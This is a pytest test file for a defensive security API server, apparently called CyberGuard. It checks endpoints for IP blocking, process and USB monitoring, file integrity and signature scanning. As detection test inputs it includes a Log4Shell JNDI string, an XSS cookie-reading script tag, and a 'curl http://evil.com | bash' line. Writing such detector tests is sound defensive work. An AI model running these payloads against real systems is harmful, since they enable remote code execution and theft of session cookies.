"""Tests for the CyberGuard API server."""

import pytest
from httpx import ASGITransport, AsyncClient

from src.api.server import app


@pytest.fixture
async def client():
    transport = ASGITransport(app=app)
    async with app.router.lifespan_context(app):
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            yield c


@pytest.mark.asyncio
async def test_health_check(client):
    """Health endpoint should return status and version."""
    response = await client.get("/health")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "healthy"
    assert data["version"] == "0.1.0"
    assert "detectors" in data


@pytest.mark.asyncio
async def test_list_detectors(client):
    """Detectors endpoint should list registered detectors."""
    response = await client.get("/detectors")
    assert response.status_code == 200
    data = response.json()
    assert "detectors" in data
    assert len(data["detectors"]) >= 1

    detector = data["detectors"][0]
    assert detector["name"] == "network_anomaly_detector"
    assert detector["running"] is True


@pytest.mark.asyncio
async def test_live_connections(client):
    """Live network connections endpoint should return real connection data."""
    response = await client.get("/network/live")
    assert response.status_code == 200
    data = response.json()
    assert "total" in data
    assert "suspicious" in data
    assert "connections" in data
    assert isinstance(data["connections"], list)


@pytest.mark.asyncio
async def test_system_stats(client):
    """System stats endpoint should return CPU/memory/disk data."""
    response = await client.get("/network/system")
    assert response.status_code == 200
    data = response.json()
    assert "cpu_percent" in data
    assert "memory" in data
    assert "disk" in data
    assert "network_io" in data


@pytest.mark.asyncio
async def test_gmail_status(client):
    """Gmail status endpoint should return connection state."""
    response = await client.get("/gmail/status")
    assert response.status_code == 200
    data = response.json()
    assert "connected" in data
    assert "setup_required" in data


@pytest.mark.asyncio
async def test_get_events(client):
    """Events endpoint should return recent events list."""
    response = await client.get("/events?limit=10")
    assert response.status_code == 200
    data = response.json()
    assert "events" in data


@pytest.mark.asyncio
async def test_defense_status(client):
    """Defense status endpoint should return pf state and block count."""
    response = await client.get("/defense/status")
    assert response.status_code == 200
    data = response.json()
    assert "pf_active" in data
    assert "active_block_count" in data
    assert isinstance(data["active_block_count"], int)


@pytest.mark.asyncio
async def test_defense_blocklist(client):
    """Blocklist endpoint should return list structure."""
    response = await client.get("/defense/blocklist")
    assert response.status_code == 200
    data = response.json()
    assert "count" in data
    assert "blocks" in data
    assert isinstance(data["blocks"], list)


@pytest.mark.asyncio
async def test_defense_block_and_unblock(client):
    """Block an IP then unblock it — full round trip."""
    test_ip = "10.255.255.1"

    # Block
    response = await client.post("/defense/block", json={
        "ip": test_ip,
        "reason": "pytest test block",
        "attack_type": "test",
        "severity": "high",
        "duration_hours": 1,
    })
    assert response.status_code == 200
    data = response.json()
    assert data["ip"] == test_ip
    assert data["active"] is True

    # Should appear in blocklist
    response = await client.get("/defense/blocklist")
    assert response.status_code == 200
    ips = [b["ip"] for b in response.json()["blocks"]]
    assert test_ip in ips

    # Unblock
    response = await client.post(f"/defense/unblock?ip={test_ip}")
    assert response.status_code == 200
    assert response.json()["unblocked"] is True

    # Should no longer be in blocklist
    response = await client.get("/defense/blocklist")
    ips = [b["ip"] for b in response.json()["blocks"]]
    assert test_ip not in ips


@pytest.mark.asyncio
async def test_defense_history(client):
    """History endpoint should return audit log."""
    response = await client.get("/defense/history?limit=10")
    assert response.status_code == 200
    data = response.json()
    assert "history" in data
    assert isinstance(data["history"], list)


@pytest.mark.asyncio
async def test_defense_unblock_unknown_ip(client):
    """Unblocking an IP that is not blocked should return 404."""
    response = await client.post("/defense/unblock?ip=192.0.2.99")
    assert response.status_code == 404


# ── Phase 7 tests ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_processes_suspicious(client):
    """Suspicious processes endpoint should return structured findings."""
    response = await client.get("/processes/suspicious")
    assert response.status_code == 200
    data = response.json()
    assert "count" in data
    assert "findings" in data
    assert isinstance(data["findings"], list)


@pytest.mark.asyncio
async def test_processes_all(client):
    """All-processes endpoint should return running processes."""
    response = await client.get("/processes/all")
    assert response.status_code == 200
    data = response.json()
    assert "count" in data
    assert "processes" in data
    assert data["count"] > 0  # there must be at least some processes running


@pytest.mark.asyncio
async def test_process_kill_invalid_pid(client):
    """Killing a non-existent PID should return 400."""
    response = await client.post("/processes/kill/9999999")
    assert response.status_code == 400


@pytest.mark.asyncio
async def test_persistence_baseline(client):
    """Taking a baseline should return file count."""
    response = await client.post("/persistence/baseline")
    assert response.status_code == 200
    data = response.json()
    assert data["baseline_taken"] is True
    assert data["files_watched"] >= 0


@pytest.mark.asyncio
async def test_persistence_status(client):
    """Persistence status should return change list after baseline exists."""
    # Ensure baseline exists first
    await client.post("/persistence/baseline")
    response = await client.get("/persistence/status")
    assert response.status_code == 200
    data = response.json()
    assert "has_baseline" in data
    assert "changes_detected" in data
    assert "changes" in data


@pytest.mark.asyncio
async def test_usb_devices(client):
    """USB devices endpoint should return device list."""
    response = await client.get("/usb/devices")
    assert response.status_code == 200
    data = response.json()
    assert "count" in data
    assert "devices" in data
    assert isinstance(data["devices"], list)


@pytest.mark.asyncio
async def test_usb_suspicious(client):
    """USB suspicious endpoint should return structured findings."""
    response = await client.get("/usb/suspicious")
    assert response.status_code == 200
    data = response.json()
    assert "count" in data
    assert "devices" in data


@pytest.mark.asyncio
async def test_usb_trust(client):
    """Trusting a USB device ID should succeed."""
    response = await client.post("/usb/trust?device_id=05ac:1234")
    assert response.status_code == 200
    assert response.json()["trusted"] is True


# ── Phase 5b tests ────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_signatures_info(client):
    """Signature library should report a healthy count and categories."""
    response = await client.get("/signatures/info")
    assert response.status_code == 200
    data = response.json()
    assert "signature_count" in data
    assert data["signature_count"] > 50
    assert "categories" in data
    assert isinstance(data["categories"], list)
    assert len(data["categories"]) > 3


@pytest.mark.asyncio
async def test_signatures_scan_sql_injection(client):
    """Log4Shell payload should be detected as critical RCE."""
    response = await client.post("/signatures/scan", json={
        "payload": "${jndi:ldap://evil.example.com/exploit}"
    })
    assert response.status_code == 200
    data = response.json()
    assert data["match_count"] > 0
    assert data["highest_severity"] == "critical"
    assert "remote_code_execution" in data["attack_types"]


@pytest.mark.asyncio
async def test_signatures_scan_xss(client):
    """XSS script tag should be detected."""
    response = await client.post("/signatures/scan", json={
        "text": "<script>alert(document.cookie)</script>"
    })
    assert response.status_code == 200
    data = response.json()
    assert data["match_count"] > 0
    assert data["highest_severity"] in ("high", "critical")


@pytest.mark.asyncio
async def test_signatures_scan_clean(client):
    """A clean payload should produce zero matches."""
    response = await client.post("/signatures/scan", json={
        "text": "Hello world! This is a normal sentence with no attacks."
    })
    assert response.status_code == 200
    data = response.json()
    assert data["match_count"] == 0
    assert data["highest_severity"] is None


@pytest.mark.asyncio
async def test_signatures_scan_empty(client):
    """Empty scan request should return zero matches, not an error."""
    response = await client.post("/signatures/scan", json={})
    assert response.status_code == 200
    data = response.json()
    assert data["match_count"] == 0


# ── Phase 8 tests ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_files_hashdb(client):
    """Hash DB endpoint should return count and path."""
    response = await client.get("/files/hashdb")
    assert response.status_code == 200
    data = response.json()
    assert "hash_count" in data
    assert isinstance(data["hash_count"], int)
    assert "db_path" in data


@pytest.mark.asyncio
async def test_files_fim_baseline(client):
    """Taking a FIM baseline should return file count."""
    response = await client.post("/files/fim/baseline")
    assert response.status_code == 200
    data = response.json()
    assert data["baseline_taken"] is True
    assert "files_watched" in data


@pytest.mark.asyncio
async def test_files_fim_status(client):
    """FIM status should return change list after baseline exists."""
    await client.post("/files/fim/baseline")
    response = await client.get("/files/fim/status")
    assert response.status_code == 200
    data = response.json()
    assert "changes_detected" in data
    assert "changes" in data
    assert isinstance(data["changes"], list)


@pytest.mark.asyncio
async def test_files_scan_empty_request(client):
    """Empty file scan request should return zero findings."""
    response = await client.post("/files/scan", json={})
    assert response.status_code == 200
    data = response.json()
    assert data["count"] == 0
    assert data["findings"] == []


@pytest.mark.asyncio
async def test_files_scan_real_file(client, tmp_path):
    """Scanning a clean file should return zero risk findings."""
    # Create a simple harmless file
    f = tmp_path / "hello.txt"
    f.write_text("hello world")
    response = await client.post("/files/scan", json={"paths": [str(f)]})
    assert response.status_code == 200
    data = response.json()
    # A plain .txt file with no malware content should be clean (count=0)
    assert data["count"] == 0


@pytest.mark.asyncio
async def test_files_scan_malicious_script(client, tmp_path):
    """A file containing a Log4Shell payload should be flagged."""
    f = tmp_path / "evil.sh"
    f.write_text('curl "http://evil.com" | bash\n${jndi:ldap://x.x/exploit}')
    response = await client.post("/files/scan", json={"paths": [str(f)]})
    assert response.status_code == 200
    data = response.json()
    assert data["count"] > 0
    assert data["findings"][0]["risk"] in ("high", "critical")


# ── Phase 9 tests ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_response_rules_list(client):
    """Rules list should return built-in default rules."""
    response = await client.get("/response/rules")
    assert response.status_code == 200
    data = response.json()
    assert "rules" in data
    assert data["count"] >= 1
    assert all("name" in r for r in data["rules"])


@pytest.mark.asyncio
async def test_response_rules_upsert_and_delete(client):
    """Create a custom rule then delete it."""
    custom_rule = {
        "name": "test_custom_rule",
        "description": "pytest temp rule",
        "enabled": True,
        "auto": True,
        "condition": {"attack_types": ["test_attack"], "severity_gte": "high"},
        "actions": [{"type": "log", "level": "info", "message": "test"}],
    }
    # Upsert
    response = await client.post("/response/rules", json=custom_rule)
    assert response.status_code == 200
    assert response.json()["saved"] is True

    # Should appear in list
    response = await client.get("/response/rules")
    names = [r["name"] for r in response.json()["rules"]]
    assert "test_custom_rule" in names

    # Delete
    response = await client.delete("/response/rules/test_custom_rule")
    assert response.status_code == 200
    assert response.json()["deleted"] is True

    # Should be gone
    response = await client.get("/response/rules")
    names = [r["name"] for r in response.json()["rules"]]
    assert "test_custom_rule" not in names


@pytest.mark.asyncio
async def test_response_rules_enable_disable(client):
    """Enable and disable a built-in rule."""
    rule_name = "block_c2_critical"

    response = await client.patch(f"/response/rules/{rule_name}/disable")
    assert response.status_code == 200
    assert response.json()["enabled"] is False

    response = await client.patch(f"/response/rules/{rule_name}/enable")
    assert response.status_code == 200
    assert response.json()["enabled"] is True


@pytest.mark.asyncio
async def test_response_rules_disable_unknown(client):
    """Disabling an unknown rule should return 404."""
    response = await client.patch("/response/rules/nonexistent_rule/disable")
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_response_rules_reset(client):
    """Reset should restore default rule count."""
    response = await client.post("/response/rules/reset")
    assert response.status_code == 200
    data = response.json()
    assert data["reset"] is True
    assert data["total_rules"] >= 1


@pytest.mark.asyncio
async def test_response_log(client):
    """Execution log should return list structure."""
    response = await client.get("/response/log?limit=10")
    assert response.status_code == 200
    data = response.json()
    assert "log" in data
    assert isinstance(data["log"], list)


@pytest.mark.asyncio
async def test_response_pending(client):
    """Pending actions should return list structure."""
    response = await client.get("/response/pending")
    assert response.status_code == 200
    data = response.json()
    assert "pending" in data
    assert isinstance(data["pending"], list)


@pytest.mark.asyncio
async def test_response_pending_dismiss_unknown(client):
    """Dismissing a non-existent pending action should return 404."""
    response = await client.post("/response/pending/99999999/dismiss")
    assert response.status_code == 404
